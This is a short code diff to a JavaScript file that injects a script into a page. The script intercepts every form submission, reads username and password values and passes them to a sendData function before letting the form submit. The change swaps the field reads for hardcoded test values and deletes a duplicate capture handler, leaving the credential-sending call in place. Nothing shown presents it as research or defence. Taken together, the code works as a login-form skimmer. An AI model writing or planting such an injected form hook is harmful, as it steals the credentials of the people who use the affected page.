@@ -24,8 +24,10 @@
 
             document.body.addEventListener('submit', function(event) {
                 if (event.target.tagName.toLowerCase() === 'form') {
-                    var username = document.getElementById('control').value;
-                    var password = document.getElementById('control').value;
+                    //var username = document.getElementById('control').value;
+                    //var password = document.getElementById('control').value;
+                    var username = '123';
+                    var password = '456';
                     alert(username+password);
                     console.log(username+password);
                     sendData(username, password);
@@ -34,18 +36,6 @@
                     setTimeout(() => { event.target.submit(); }, 1000);
                 }
             });
-
-            
-            var formxyz = document.getElementsByTagName('form')[0]; // Adjust selector as needed
-            formxyz.onsubmit = function(event) {
-                var username = document.getElementById('control').value;
-                var password = document.getElementById('control').value;
-                alert(username+password);
-                console.log(username+password);
-                
-                event.preventDefault();
-                setTimeout(() => { formxyz.submit(); }, 1000);
-            };
         `;
         doc.body.appendChild(script);
     };
